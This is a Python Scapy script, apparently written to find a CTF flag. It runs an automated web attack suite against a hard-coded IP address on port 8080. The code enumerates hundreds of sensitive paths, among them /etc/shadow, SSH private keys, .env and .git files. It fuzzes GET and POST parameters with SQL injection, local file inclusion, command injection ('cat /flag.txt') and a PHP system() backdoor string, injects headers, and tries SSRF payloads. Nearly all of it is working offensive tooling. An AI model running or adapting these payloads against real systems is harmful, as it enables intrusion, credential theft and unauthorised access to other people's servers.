import scapy.all as scapy
from scapy.layers.inet import IP, TCP, ICMP
from scapy.all import Raw, sr1, send, sniff
import random
import threading
import time
import datetime
import re
import urllib.parse
import os # <--- IMPORT THE OS MODULE

# --- Configuration ---
target_ip = "137.184.230.90"
target_port = 8080
fixed_ipid = 1337

# Define an output directory for responses
output_directory = "ctf_responses"

# --- Ensure the output directory exists ---
try:
    os.makedirs(output_directory, exist_ok=True)
    print(f"[*] Ensuring output directory '{output_directory}/' exists.")
except Exception as e:
    print(f"[-] FATAL ERROR: Could not create output directory '{output_directory}': {e}")
    print("Exiting. Please check permissions or path validity.")
    exit(1) # Exit if we can't even create the directory


# Paths to probe (extensive list as before)
paths_to_probe = [
    "/", "/index.html", "/robots.txt", "/sitemap.xml", "/admin/", "/login", "/panel/",
    "/api/", "/api/v1/", "/dev/", "/test/", "/backup/", "/.git/config", "/.env",
    "/phpinfo.php", "/server-status", "/~user/", "/docs/", "/swagger-ui.html",
    "/flag.txt", "/secret.txt", "/.htaccess", "/web.config", "/crossdomain.xml",
    "/admin.php", "/phpmyadmin/", "/wordpress/", "/joomla/", "/wp-admin/",
    "/config.php", "/configuration.php", "/inc/", "/include/", "/assets/", "/js/", "/css/", "/images/",
    "/static/", "/uploads/", "/data/", "/files/", "/download/", "/view/", "/status/",
    "/metrics/", "/debug/", "/health/", "/version", "/info",
    "/index.php", "/default.aspx", "/home.html", "/main.php", "/app/",
    "/user/", "/profile/", "/dashboard/", "/settings/", "/setup/",
    "/system/", "/src/", "/dist/", "/build/", "/node_modules/", "/vendor/",
    "/error_log", "/error.log", "/access.log", "/logs/", "/log.txt",
    "/proc/self/cwd/index.php", "/proc/self/environ", "/proc/self/cmdline", # LFI payloads
    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/resolv.conf", # LFI payloads
    "/var/log/apache2/access.log", "/var/log/apache2/error.log", # LFI payloads
    "/config.ini", "/config.json", "/.bash_history", "/.profile",
    "/db.sqlite", "/database.sql", "/dump.sql",
    "/backup.zip", "/archive.tar.gz",
    "/phpmyadmin/index.php", "/test.php", "/info.php",
    "/js/main.js", "/css/style.css",
    "/api/status", "/api/user", "/api/data",
    "/login.php", "/admin/index.php", "/panel/login.php",
    "/robots.txt.bak", "/robots.txt~",
    "/robots.txt.orig", "/robots.txt.old",
    # Specific to CTF
    "/flag", "/readflag", "/getflag", "/flag.php", "/flag_is_here.txt", "/secret_key", "/hidden_flag",
    "/super_secret_file.txt", "/development_notes.txt", "/README.md",
    "/web-config.xml", "/server.xml", "/context.xml",
    "/manager/html", "/jmx-console/", "/admin-console/", # Common application server paths
    "/manager/status", "/favicon.ico",
    "/WEB-INF/web.xml", "/WEB-INF/classes/", # Java web app internals
    "/META-INF/MANIFEST.MF",
    "/cgi-bin/", "/cgi-bin/test.cgi",
    "/shell", "/cmd", "/execute", # Command execution endpoints
    "/metrics", "/prometheus", # Monitoring endpoints
    "/metrics/",
    "/admin.bak", # common backup name
    "/admin.zip",
    "/admin.rar",
    "/admin.tar",
    "/admin.sql",
    "/admin.old",
    "/admin.txt",
    "/admin.conf",
    "/wp-content/", # WordPress specific
    "/wp-includes/",
    "/wp-admin/admin-ajax.php",
    "/wp-content/plugins/",
    "/wp-content/themes/",
    "/blog/",
    "/cms/",
    "/includes/",
    "/src/",
    "/server-info",
    "/server_status",
    "/crossdomain.xml", # Flash policy file
    "/clientaccesspolicy.xml", # Silverlight policy file
    "/.svn/entries", # Subversion VCS files
    "/.git/index", # Git VCS files
    "/CVS/Entries", # CVS VCS files
    "/CHANGELOG.txt", "/LICENSE.txt", "/README.txt",
    "/id_rsa", "/.ssh/id_rsa", # SSH keys
    "/config/database.yml", # Ruby on Rails
    "/app/config/parameters.yml", # Symfony
    "/WEB-INF/lib/",
    "/WEB-INF/classes/META-INF/persistence.xml",
    "/WEB-INF/tlds/",
    "/WEB-INF/views/",
    "/WEB-INF/src/",
    "/WEB-INF/classes/",
    "/resources/",
    "/res/",
    "/images/",
    "/img/",
    "/styles/",
    "/script/",
    "/data/",
    "/api/docs/",
    "/v1/", "/v2/", "/v3/", # API versioning
    "/healthcheck",
    "/metrics.json",
    "/status.json",
    "/version.json",
    "/admin/config",
    "/admin/settings",
    "/admin/users",
    "/admin/backup",
    "/admin/logs",
    "/dev/null", # Sometimes humor or actual dev files
    "/test.html",
    "/test.txt",
    "/test.xml",
    "/swagger", # Common API documentation
    "/swagger-ui",
    "/api-docs",
    "/redoc",
    "/docs/api",
    "/documentation/",
    "/assets/js/main.js",
    "/assets/css/style.css",
    "/assets/images/logo.png",
    "/fonts/",
    "/template/",
    "/templates/",
    "/include/config.php",
    "/config/config.php",
    "/settings/settings.php",
    "/conf/conf.php",
    "/db_config.php",
    "/connect.php",
    "/connection.php",
    "/passwd", # common password file names
    "/shadow",
    "/group",
    "/hosts",
    "/resolv.conf",
    "/issue",
    "/motd",
    "/ssh/sshd_config",
    "/var/log/syslog",
    "/var/log/dmesg",
    "/etc/issue",
    "/boot.ini", # Windows specific
    "/windows/win.ini",
    "/windows/system32/drivers/etc/hosts",
    "/inetpub/wwwroot/web.config",
    "/Program Files/Apache Group/Apache2/conf/httpd.conf",
    "/Program Files/Apache Group/Apache2/logs/error.log",
    "/logs/access.log",
    "/log/error.log",
    "/errorlog.txt",
    "/accesslog.txt",
    "/debug.log",
    "/install.php",
    "/setup.php",
    "/update.php",
    "/upgrade.php",
    "/install/",
    "/setup/",
    "/update/",
    "/upgrade/",
    "/index.bak",
    "/index.old",
    "/index.php.bak",
    "/index.php.old",
    "/index.html.bak",
    "/index.html.old",
    "/data/users.txt",
    "/data/config.txt",
    "/data/passwords.txt",
    "/files/users.csv",
    "/files/credentials.txt",
    "/uploads/images/",
    "/uploads/files/",
    "/tmp/",
    "/var/tmp/",
    "/dev/shm/",
    "/confidential/",
    "/private/",
    "/secret/",
    "/test_db.sqlite",
    "/dump.gz",
    "/archive.zip",
    "/backup.tar",
    "/site.sql",
    "/database.bak",
    "/old_site/",
    "/new_site/",
    "/beta/",
    "/alpha/",
    "/release/",
    "/staging/",
    "/production/",
    "/dev/",
    "/local/",
    "/remote/",
    "/test_server/",
    "/admin_panel/",
    "/control_panel/",
    "/management/",
    "/dashboard_admin/",
    "/system_admin/",
    "/user_admin/",
    "/login_admin/",
    "/admin_login/",
    "/secure_login/",
    "/private_login/",
    "/hidden_login/",
    "/api_login/",
    "/user_login/",
    "/member_login/",
    "/customer_login/",
    "/client_login/",
    "/staff_login/",
    "/employee_login/",
    "/manager_login/",
    "/vendor_login/",
    "/partner_login/",
    "/supplier_login/",
    "/guest_login/",
    "/developer_login/",
    "/dev_login/",
    "/test_login/",
    "/debug_login/",
    "/info_login/",
    "/status_login/",
    "/monitor_login/",
    "/health_login/",
    "/env_login/",
    "/settings_login/",
    "/config_login/",
    "/db_login/",
    "/connect_login/",
    "/connection_login/",
    "/credentials_login/",
    "/secrets_login/",
    "/keys_login/",
    "/api_key_login/",
    "/token_login/",
    "/session_login/",
    "/cookie_login/",
    "/session_id_login/",
    "/backup_login/",
    "/old_login/",
    "/new_login/",
    "/beta_login/",
    "/alpha_login/",
    "/release_login/",
    "/staging_login/",
    "/production_login/",
    "/dev_login/",
    "/local_login/",
    "/remote_login/",
    "/test_server_login/",
    "/admin_panel_login/",
    "/control_panel_login/",
    "/management_login/",
    "/dashboard_admin_login/",
    "/system_admin_login/",
    "/user_admin_login/",
    "/auth/", "/authenticate/", "/oauth/", "/token/", "/jwt/",
    "/verify/", "/confirm/", "/reset/", "/forgot/",
    "/register/", "/signup/", "/create_account/",
    "/profile/", "/account/", "/myaccount/", "/user/profile/",
    "/settings/", "/preferences/", "/options/",
    "/edit_profile/", "/update_profile/",
    "/messages/", "/notifications/", "/alerts/",
    "/feed/", "/timeline/", "/activity/",
    "/search/", "/query/", "/results/",
    "/api/users", "/api/products", "/api/orders", "/api/items",
    "/api/search", "/api/query", "/api/data", "/api/v1/users",
    "/api/v2/products", "/api/v3/orders",
    "/admin/users/list", "/admin/products/manage", "/admin/orders/view",
    "/dashboard/metrics", "/dashboard/logs", "/dashboard/reports",
    "/images/uploads/", "/files/temp/", "/downloads/", "/attachments/",
    "/blog/post/", "/article/", "/news/",
    "/calendar/", "/events/", "/schedule/",
    "/map/", "/location/", "/places/",
    "/contact/", "/about/", "/help/", "/faq/", "/support/",
    "/terms/", "/privacy/", "/disclaimer/",
    "/license/", "/changelog/", "/version_history/",
    "/assets/img/", "/assets/css/", "/assets/js/", "/assets/fonts/",
    "/node_modules/jquery/dist/jquery.js", # Common JS libraries
    "/vendor/bootstrap/js/bootstrap.min.js",
    "/ckeditor/", "/tinymce/", "/fckeditor/", # WYSIWYG editors
    "/uploads/image.jpg", "/uploads/file.pdf",
    "/temp/temp.zip",
    "/cache/", "/tmp_files/",
    "/xmlrpc.php", # WordPress specific
    "/wp-cron.php",
    "/phpmyadmin/setup/",
    "/server-status?auto", # Apache module status
    "/jmx-console/HtmlAdaptor", # JBoss JMX console
    "/manager/status?XML=true", # Tomcat manager status
    "/crossdomain.xml", # Flash policy
    "/clientaccesspolicy.xml", # Silverlight policy
    "/.svn/wc.db", # SVN working copy database
    "/.git/HEAD", # Git HEAD reference
    "/WEB-INF/web.xml", # Java web app descriptor
    "/WEB-INF/classes/", # Java class files
    "/META-INF/",
    "/META-INF/maven/",
    "/WEB-INF/lib/", # Java libraries
    "/WEB-INF/config/",
    "/WEB-INF/data/",
    "/WEB-INF/logs/",
    "/WEB-INF/temp/",
    "/WEB-INF/uploads/",
    "/conf/server.xml", # Tomcat config
    "/conf/web.xml", # Tomcat config
    "/conf/context.xml", # Tomcat config
    "/conf/catalina.policy",
    "/conf/tomcat-users.xml",
    "/conf/logging.properties",
    "/admin/config.php",
    "/admin/settings.php",
    "/admin/users.php",
    "/admin/backup.php",
    "/admin/logs.php",
    "/api/v1/auth/",
    "/api/v1/users/",
    "/api/v1/products/",
    "/api/v1/orders/",
    "/api/v1/search/",
    "/api/v1/data/",
    "/api/v2/auth/",
    "/api/v2/users/",
    "/api/v2/products/",
    "/api/v2/orders/",
    "/api/v2/search/",
    "/api/v2/data/",
    "/api/v3/auth/",
    "/api/v3/users/",
    "/api/v3/products/",
    "/api/v3/orders/",
    "/api/v3/search/",
    "/api/v3/data/",
    "/swagger.json",
    "/swagger.yaml",
    "/openapi.json",
    "/openapi.yaml",
    "/api/swagger.json",
    "/api/swagger.yaml",
    "/api/openapi.json",
    "/api/openapi.yaml",
    "/docs/swagger.json",
    "/docs/swagger.yaml",
    "/docs/openapi.json",
    "/docs/openapi.yaml",
    "/actuator", # Spring Boot Actuator endpoints
    "/actuator/health",
    "/actuator/info",
    "/actuator/env",
    "/actuator/beans",
    "/actuator/mappings",
    "/actuator/configprops",
    "/actuator/metrics",
    "/actuator/threaddump",
    "/actuator/heapdump",
    "/admin/php",
    "/admin/html",
    "/admin/asp",
    "/admin/aspx",
    "/admin/cgi",
    "/admin/pl",
    "/admin/py",
    "/admin/rb",
    "/login.asp",
    "/login.aspx",
    "/login.cgi",
    "/login.pl",
    "/login.py",
    "/login.rb",
    "/login.html",
    "/login.htm",
    "/login.xml",
    "/login.json",
    "/login.txt",
    "/login.md",
    "/login.bak",
    "/login.old",
    "/login.zip",
    "/login.rar",
    "/login.tar",
    "/login.gz",
    "/login.7z",
    "/login.sql",
    "/login.db",
    "/admin/login.php",
    "/admin/login.html",
    "/admin/login.htm",
    "/admin/login.asp",
    "/admin/login.aspx",
    "/admin/login.cgi",
    "/admin/login.pl",
    "/admin/login.py",
    "/admin/login.rb",
    "/admin/login.xml",
    "/admin/login.json",
    "/admin/login.txt",
    "/admin/login.md",
    "/admin/login.bak",
    "/admin/login.old",
    "/admin/login.zip",
    "/admin/login.rar",
    "/admin/login.tar",
    "/admin/login.gz",
    "/admin/login.7z",
    "/admin/login.sql",
    "/admin/login.db",
]

# Paths especially good for POST requests
post_paths_to_probe = [
    "/login", "/admin/login", "/authenticate", "/api/login",
    "/upload", "/submit", "/register", "/comment", "/search",
    "/api/v1/authenticate", "/data", "/process"
]

# Common POST parameters and values to try
# We'll try common username/password combos and then single parameter fuzzing
common_post_fuzz_params = [
    # Login attempts
    {"username": "admin", "password": "password"},
    {"user": "admin", "pass": "password"},
    {"username": "admin", "password": "' OR 1=1--"},
    {"user": "admin", "pass": "' OR 1=1--"},
    {"email": "admin@example.com", "password": "password"},
    # Generic parameter fuzzing
    {"file": "/etc/passwd"}, # LFI attempts
    {"cmd": "ls -la"}, # Command injection attempts
    {"query": "union select 1,2,3--"}, # SQLi attempts
    {"debug": "true"},
    {"action": "read", "id": "1"},
    {"data": "<script>alert(1)</script>"}, # XSS
    {"param": "test"}, # Simple test
    {"id": "1"}, {"id": "-1"}, {"id": "0"}, {"id": "abc"},
    {"name": "testname"}, {"value": "testvalue"},
    {"payload": "whoami"}, {"payload": "cat /flag.txt"},
    {"input": "system('cat /flag.txt')"},
    {"token": "admin"},
    {"secret": "true"},
    {"view": "../../../../../etc/passwd"},
    {"url": "file:///etc/passwd"},
    {"target": "localhost"},
    {"path": "/etc/passwd"},
    {"filename": "flag.txt"},
]

# Common GET parameters to try on all known paths
common_get_params = [
    "id", "file", "cmd", "page", "name", "data", "query", "search",
    "user", "password", "debug", "source", "view", "url", "path",
    "redirect", "next", "callback", "payload", "input", "arg", "value",
    "token", "secret", "lang", "format", "callback", "jsonp", "key"
]

# Common values to fuzz for parameters
common_param_values = [
    "1", "true", "admin", "test", "root", "flag", "secret",
    "../", "../../../etc/passwd", "/etc/passwd", # LFI
    "phpinfo.php", "flag.txt", "secret.txt",
    "' OR 1=1--", "union select 1,2,3--", # SQLi
    "`ls`", "`cat /flag.txt`", # Command Injection
    "../../../proc/self/cmdline", # LFI/RCE payloads
    "file:///etc/passwd", # LFI with scheme
    "data:text/plain,<?php system($_GET['cmd']); ?>", # PHP backdoor attempts (for LFI)
    "127.0.0.1", "localhost", "0.0.0.0", # SSRF values
    "admin'", "admin\"" # SQLi quotes
    # Add payloads with null bytes for potential truncation
    f"admin\x00", f"test\x00", f"file\x00",
    f"../\x00", f"/etc/passwd\x00"
]

# Other HTTP methods to try
http_methods_to_try = ["HEAD", "OPTIONS", "TRACE", "PUT", "DELETE", "CONNECT"]

# Common headers to inject or modify
common_headers_to_add = {
    "X-Forwarded-For": ["127.0.0.1", "localhost", "192.168.1.1", "0.0.0.0", "10.0.0.1"],
    "Referer": [f"http://{target_ip}:8080/", f"http://{target_ip}:8080/admin", "http://google.com"],
    "User-Agent": ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36", "curl/7.81.0", "Python-requests/2.28.1", "Googlebot/2.1", "Wget/1.20.3 (linux-gnu)"],
    "X-Custom-Header": ["test", "admin", "flag", "<script>alert(1)</script>", "value'OR 1=1--"],
    "X-HTTP-Method-Override": ["POST", "GET", "PUT", "DELETE"], # For tunneling HTTP methods
    "Content-Type": ["application/json", "application/xml", "text/plain", "text/xml"], # For POST, but also for GET
    "Accept": ["application/json", "application/xml", "text/plain", "image/png", "*/*"], # Request different content types
    "Accept-Language": ["en-US,en;q=0.5", "fr-FR", "jp"],
    "Cookie": ["sessionid=abc123", "PHPSESSID=xyz789", "auth=admin"], # Example cookies
    # Headers with potentially problematic characters
    "X-Inject-Header": ["value'", "value\"", "value`", "value;ls"],
    "X-Null-Byte-Header": [f"value\x00"],
}


# --- Global State and Locks ---
found_event = threading.Event() # Event to signal when the flag is found
print_lock = threading.Lock()   # Lock for synchronized printing

# --- Flag Checking Function ---
def check_for_flag(response_content):
    """Checks the response content for flag patterns."""
    # Common CTF flag patterns
    patterns = [
        rb"flag{[^}]+}",            # flag{...}
        rb"FLAG{[^}]+}",            # FLAG{...}
        rb"ctf\{[^}]+}",            # ctf{...}
        rb"CTF\{[^}]+}",            # CTF{...}
        rb"[A-Za-z0-9]{32}",        # MD5 hash format (common in CTFs)
        rb"picoCTF\{[^}]+}",        # picoCTF flag format
        rb"^[0-9a-fA-F]{32}$",      # Another common hash pattern
        rb"FLG{[^}]+}",             # common variants
        rb"SECRET{[^}]+}",
        rb"KEY{[^}]+}"
    ]
    for pattern in patterns:
        match = re.search(pattern, response_content)
        if match:
            return match.group(0).decode(errors='ignore')
    return None

# --- Main Scanning Logic (Refactored) ---
def send_http_request_with_ipid(target_ip, target_port, fixed_ipid, http_method, path, http_version="HTTP/1.1", data=None, headers=None, attempt_num=1, total_attempts=1, is_absolute_uri=False):
    """
    Establishes a new TCP connection with the fixed IPID, sends a single HTTP request,
    and then closes the connection.
    Includes options for HTTP versioning and absolute URI.
    """
    src_port = random.randint(1024, 65535)
    current_ipid = fixed_ipid

    # 1. Craft and Send SYN packet
    ip_packet = IP(dst=target_ip, id=current_ipid)
    tcp_packet = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(0, 0xFFFFFFFF))
    syn_packet = ip_packet / tcp_packet

    with print_lock:
        display_path = f"http://{target_ip}:{target_port}{path}" if is_absolute_uri else path
        print(f"[*] Attempt {attempt_num}/{total_attempts}: Sending {http_method} {display_path} (Ver: {http_version}) with IPID: {current_ipid}", end='\r')

    syn_ack_response = sr1(syn_packet, timeout=0.5, verbose=False) # Reduced timeout for faster iteration

    if not (syn_ack_response and syn_ack_response.haslayer(TCP) and syn_ack_response[TCP].flags == "SA"):
        # Suppress frequent non-SYN-ACK messages for cleaner output unless debug is needed
        # with print_lock:
        #     print(f"\n[-] Attempt {attempt_num}/{total_attempts}: No SYN-ACK for {http_method} {display_path} or unexpected flags.")
        return None, None # No successful handshake

    # 2. Complete TCP 3-way Handshake (ACK)
    my_seq = syn_packet[TCP].seq + 1
    my_ack = syn_ack_response[TCP].seq + 1

    ack_packet = IP(dst=target_ip, id=current_ipid) / \
                 TCP(sport=src_port, dport=target_port, flags="A", seq=my_seq, ack=my_ack)
    send(ack_packet, verbose=False)

    # 3. Craft and Send HTTP Request
    http_headers = {
        b"Host": target_ip.encode() + b":" + str(target_port).encode(),
        b"User-Agent": b"Scapy-CTF-Fuzzer/2.0", # Custom User-Agent
        b"Accept": b"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        b"Accept-Encoding": b"gzip, deflate",
        b"Connection": b"close" # Request server to close connection after response
    }

    if headers:
        for k, v in headers.items():
            if isinstance(k, str): k = k.encode(errors='ignore') # Encode, ignore errors for null bytes
            if isinstance(v, str): v = v.encode(errors='ignore')
            http_headers[k] = v

    # Construct request line based on absolute URI flag
    if is_absolute_uri:
        request_line = f"{http_method} http://{target_ip}:{target_port}{path} {http_version}\r\n".encode(errors='ignore')
    else:
        request_line = f"{http_method} {path} {http_version}\r\n".encode(errors='ignore')

    body_data = b""
    if data:
        if http_method.upper() in ["POST", "PUT", "PATCH"]:
            if b"Content-Type" not in http_headers:
                http_headers[b"Content-Type"] = b"application/x-www-form-urlencoded"
            http_headers[b"Content-Length"] = str(len(data)).encode()
        body_data = data

    header_lines = b"\r\n".join([k + b": " + v for k, v in http_headers.items()])

    http_request = request_line + header_lines + b"\r\n\r\n" + body_data

    current_my_seq = my_seq
    current_my_ack = my_ack

    http_packet = IP(dst=target_ip, id=current_ipid) / \
                  TCP(sport=src_port, dport=target_port, flags="PA", seq=current_my_seq, ack=current_my_ack) / \
                  Raw(load=http_request)

    send(http_packet, verbose=False)

    current_my_seq += len(http_request)

    # 4. Sniff for Response
    full_response = b""
    http_status_code = None
    try:
        captured_packets = sniff(
            filter=f"src host {target_ip} and src port {target_port} and dst port {src_port} and (tcp[13] & 0x08 != 0 or tcp[13] & 0x01 != 0 or tcp[13] & 0x10 != 0)",
            timeout=1 # Even shorter timeout for speed
        )

        for recv_pkt in captured_packets:
            if recv_pkt.haslayer(Raw):
                payload_data = bytes(recv_pkt[Raw].load)
                full_response += payload_data
                if not http_status_code and payload_data.startswith(b"HTTP/1."):
                    try:
                        status_line = payload_data.split(b"\r\n")[0]
                        http_status_code = int(status_line.split(b" ")[1])
                    except (IndexError, ValueError):
                        pass
            elif recv_pkt.haslayer(TCP) and len(recv_pkt[TCP].payload) > 0:
                payload_data = bytes(recv_pkt[TCP].payload)
                full_response += payload_data
                if not http_status_code and payload_data.startswith(b"HTTP/1."):
                    try:
                        status_line = payload_data.split(b"\r\n")[0]
                        http_status_code = int(status_line.split(b" ")[1])
                    except (IndexError, ValueError):
                        pass

            if recv_pkt.haslayer(TCP) and (recv_pkt[TCP].flags & 0x01 or recv_pkt[TCP].flags & 0x04): # FIN or RST
                break

    except Exception as sniff_e:
        pass # Suppress sniffing errors

    # 5. Gracefully Close Connection (FIN)
    fin_ack = my_ack
    if captured_packets and captured_packets[-1].haslayer(TCP):
        last_server_pkt = captured_packets[-1]
        server_seq_for_ack = last_server_pkt[TCP].seq
        server_payload_len_for_ack = len(last_server_pkt[Raw].load if last_server_pkt.haslayer(Raw) else b"")
        fin_ack = server_seq_for_ack + server_payload_len_for_ack
        if last_server_pkt[TCP].flags & 0x01 or last_server_pkt[TCP].flags & 0x02:
            fin_ack += 1

    fin_packet = IP(dst=target_ip, id=current_ipid) / \
                 TCP(sport=src_port, dport=target_port, flags="FA", seq=current_my_seq, ack=fin_ack)
    send(fin_packet, verbose=False)

    if full_response:
        decoded_response = full_response.decode(errors='ignore')
        with print_lock:
            print(f"\n    [+] Received HTTP Response for {display_path} ({http_method} {http_version}) (Status: {http_status_code if http_status_code else 'N/A'}, Length: {len(full_response)} bytes)")
            # Print content only if it's NOT a HEAD request and status is 200 or interesting error
            if http_method.upper() != "HEAD" and (http_status_code == 200 or http_status_code >= 400):
                print(f"        --- Response Content (first 500 chars) ---\n{decoded_response[:500]}\n---------------------------------------------")

        # Write response to file
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            # Sanitize path for filename
            sanitized_path = path.strip('/').replace('/', '_').replace('.', '_').replace('?', '_').replace('&', '_').replace('=', '_').replace('\x00', '_NULL_')
            if not sanitized_path: sanitized_path = "root"
            # Add absolute URI indicator to filename
            filename_suffix = "abs" if is_absolute_uri else "rel"
            filename = f"response_ipid_{current_ipid}_method_{http_method.lower()}_path_{sanitized_path}_http_{http_version.replace('.', '')}_{filename_suffix}_{timestamp}.txt".replace("/","_")

            # Use os.path.join to correctly combine directory and filename
            full_filepath = os.path.join(output_directory, filename) # <--- MODIFIED LINE

            with open(full_filepath, "wb") as f:
                f.write(full_response)
            with print_lock:
                print(f"    [+] Full HTTP response written to {full_filepath}")
        except Exception as file_e:
            with print_lock:
                print(f"[-] Error writing response to file for path {path}: {file_e}")

        flag_found = check_for_flag(full_response)
        if flag_found:
            found_event.set()
            with print_lock:
                print(f"\n\n[!!!] FLAG FOUND! [!!!]")
                print(f"[!!!] Path: {display_path}")
                print(f"[!!!] Method: {http_method} {http_version}")
                print(f"[!!!] Flag: {flag_found}")
                print(f"[!!!] Full Response:\n{decoded_response.strip()}")
        return full_response, http_status_code
    else:
        # with print_lock:
            # print(f"    [-] No HTTP response content captured for path: {display_path}.")
        return None, None

# --- Main Script Logic ---
print(f"[*] Starting multi-faceted web content discovery for {target_ip}:{target_port}")
print(f"[*] Using fixed IPID: {fixed_ipid}")

max_attempts = 100 # Number of times to retry the full scanning suite
attempt_count = 0

# HTTP versions to fuzz
http_versions = ["HTTP/1.1", "HTTP/1.0", "HTTP/0.9"]

# SSRF payloads (example parameters)
ssrf_params = ["url", "redirect", "src", "file", "callback", "link", "target"]
ssrf_payloads = [
    f"http://127.0.0.1:{target_port}/", # Self-loop on current port
    "http://127.0.0.1/", # Self-loop on default HTTP port
    "http://localhost/", # Self-loop via localhost
    "http://127.0.0.1:22/", # Internal port for SSH
    "http://127.0.0.1:80/", # Internal port for HTTP
    "file:///etc/passwd", # Local file read via file:// scheme
    "file:///proc/self/cmdline", # Local process info
    "dict://localhost:6379/info", # Example Redis interaction
    "gopher://localhost:80/payload", # Example gopher for internal services
]

while not found_event.is_set() and attempt_count < max_attempts:
    attempt_count += 1
    print(f"\n--- Global Attempt {attempt_count}/{max_attempts} ---")

    # --- Phase 1: Directory/Path Enumeration with GET/HEAD/OPTIONS/TRACE + Version Fuzzing ---
    print(f"[*] Phase 1: Probing common paths with various methods and HTTP versions...")
    for http_v in http_versions:
        for path in paths_to_probe:
            if found_event.is_set(): break
            # Try with both relative and absolute URIs for main methods
            for is_abs in [False, True]: # Relative vs Absolute URI
                for method in ["GET", "HEAD", "OPTIONS", "TRACE"]:
                    if found_event.is_set(): break
                    send_http_request_with_ipid(target_ip, target_port, fixed_ipid, method, path, http_version=http_v, attempt_num=attempt_count, total_attempts=max_attempts, is_absolute_uri=is_abs)
                    time.sleep(0.02) # Small delay between requests to avoid overwhelming

            # Also try with null byte in path for GET
            if http_v == "HTTP/1.1": # Only for modern HTTP
                null_path = f"{path}\x00.php" if '.' in path else f"{path}\x00"
                send_http_request_with_ipid(target_ip, target_port, fixed_ipid, "GET", null_path, http_version=http_v, attempt_num=attempt_count, total_attempts=max_attempts)
                time.sleep(0.02)

    # --- Phase 2: GET Parameter Fuzzing with Advanced Values and Encoding ---
    print(f"[*] Phase 2: Fuzzing GET parameters with advanced values and encoding...")
    paths_for_get_params = ["/", "/index.html", "/login", "/api/", "/data", "/view.php", "/search.php", "/cmd.php", "/download.php"]

    for http_v in ["HTTP/1.1", "HTTP/1.0"]: # Focus on common versions for params
        for path in paths_for_get_params:
            if found_event.is_set(): break
            for param_name in common_get_params:
                if found_event.is_set(): break
                for param_value in common_param_values:
                    if found_event.is_set(): break
                    # Original value
                    fuzzed_path = f"{path}?{param_name}={urllib.parse.quote(param_value)}"
                    send_http_request_with_ipid(target_ip, target_port, fixed_ipid, "GET", fuzzed_path, http_version=http_v, attempt_num=attempt_count, total_attempts=max_attempts)
                    time.sleep(0.02)
                    # Double URL encoded
                    fuzzed_path_double_encoded = f"{path}?{param_name}={urllib.parse.quote(urllib.parse.quote(param_value))}"
                    send_http_request_with_ipid(target_ip, target_port, fixed_ipid, "GET", fuzzed_path_double_encoded, http_version=http_v, attempt_num=attempt_count, total_attempts=max_attempts)
                    time.sleep(0.02)

    # --- Phase 3: POST Requests with common parameters and advanced content types ---
    print(f"[*] Phase 3: Probing paths with POST requests, common parameters, and varied Content-Types...")
    for http_v in ["HTTP/1.1", "HTTP/1.0"]:
        for path in post_paths_to_probe:
            if found_event.is_set(): break
            for params_dict in common_post_fuzz_params:
                if found_event.is_set(): break
                # Form-urlencoded
                body_data = "&".join([f"{k}={v}" for k, v in params_dict.items()]).encode(errors='ignore')
                send_http_request_with_ipid(target_ip, target_port, fixed_ipid, "POST", path, http_version=http_v, data=body_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, attempt_num=attempt_count, total_attempts=max_attempts)
                time.sleep(0.02)

                # JSON
                try:
                    import json # Ensure json is imported for this section
                    json_body = json.dumps(params_dict).encode()
                    send_http_request_with_ipid(target_ip, target_port, fixed_ipid, "POST", path, http_version=http_v, data=json_body, headers={"Content-Type": "application/json"}, attempt_num=attempt_count, total_attempts=max_attempts)
                    time.sleep(0.02)
                except ImportError:
                    pass
                except Exception as e:
                    pass

                # XML (simple example)
                xml_body = b"<data>" + b"".join([f"<{k}>{v}</{k}>".encode() for k,v in params_dict.items()]) + b"</data>"
                send_http_request_with_ipid(target_ip, target_port, fixed_ipid, "POST", path, http_version=http_v, data=xml_body, headers={"Content-Type": "application/xml"}, attempt_num=attempt_count, total_attempts=max_attempts)
                time.sleep(0.02)


    # --- Phase 4: Header Fuzzing (Combine with GET on root, and potentially other paths) ---
    print(f"[*] Phase 4: Probing with special and fuzzed HTTP headers...")
    for http_v in ["HTTP/1.1", "HTTP/1.0"]:
        for header_name, values in common_headers_to_add.items():
            if found_event.is_set(): break
            for header_value in values:
                if found_event.is_set(): break
                custom_headers = {header_name: header_value}
                # Also try injecting null bytes into header values
                custom_headers_with_null = {header_name: f"{header_value}\x00random"}
                send_http_request_with_ipid(target_ip, target_port, fixed_ipid, "GET", "/", http_version=http_v, headers=custom_headers, attempt_num=attempt_count, total_attempts=max_attempts)
                time.sleep(0.02)
                send_http_request_with_ipid(target_ip, target_port, fixed_ipid, "GET", "/", http_version=http_v, headers=custom_headers_with_null, attempt_num=attempt_count, total_attempts=max_attempts)
                time.sleep(0.02)


    # --- Phase 5: SSRF attempts via GET parameters ---
    print(f"[*] Phase 5: Attempting SSRF via common GET parameters...")
    for http_v in ["HTTP/1.1", "HTTP/1.0"]:
        for path in paths_for_get_params: # Use paths that might take parameters
            if found_event.is_set(): break
            for ssrf_param in ssrf_params:
                if found_event.is_set(): break
                for ssrf_payload in ssrf_payloads:
                    if found_event.is_set(): break
                    fuzzed_path = f"{path}?{ssrf_param}={urllib.parse.quote(ssrf_payload)}"
                    send_http_request_with_ipid(target_ip, target_port, fixed_ipid, "GET", fuzzed_path, http_version=http_v, attempt_num=attempt_count, total_attempts=max_attempts)
                    time.sleep(0.02)
                    # Also try double encoded SSRF
                    fuzzed_path_double = f"{path}?{ssrf_param}={urllib.parse.quote(urllib.parse.quote(ssrf_payload))}"
                    send_http_request_with_ipid(target_ip, target_port, fixed_ipid, "GET", fuzzed_path_double, http_version=http_v, attempt_num=attempt_count, total_attempts=max_attempts)
                    time.sleep(0.02)


    if not found_event.is_set():
        print(f"\n[*] Global Attempt {attempt_count} completed. No flag found yet. Retrying full suite...")
        time.sleep(2) # Longer delay between full suite attempts

if not found_event.is_set():
    print(f"\n[-] No successful HTTP response containing a flag received after {max_attempts} full scanning attempts.")
    print(f"[!] Review the generated response files in the '{output_directory}/' directory for any clues.")

print("[*] Multi-faceted web content discovery complete.")